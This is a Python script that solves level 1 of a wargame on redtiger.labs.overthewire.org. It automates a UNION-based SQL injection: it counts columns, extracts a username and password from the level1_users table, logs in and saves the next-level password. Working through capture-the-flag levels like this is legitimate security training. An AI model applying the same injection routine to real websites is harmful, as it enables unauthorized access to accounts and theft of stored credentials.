#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Simple sqli injection

    Target: Get the login for the user Hornoxe 
    Tablename: level1_users 
    '''
    table_name = 'level1_users'
    url = "https://redtiger.labs.overthewire.org/level1.php"
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level1login'

    # Counting the number of columns
    data = dict(cat='1 order by %s')
    if not (columns := tg.count_columns(url, data)):
        return False

    # Search for visible columns and desired data
    payload = f"-1 union select %s from {table_name}"
    if not (keys := tg.find_visible_columns(url, columns, payload, 'cat', finds)):
        return False

    # Authorization
    data = dict(user=keys[0], password=keys[1], login='Login')
    response = req.post_request(url, data)

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    # Save cookie
    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
    except:
        cooks = dict(level2login=passw)

    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
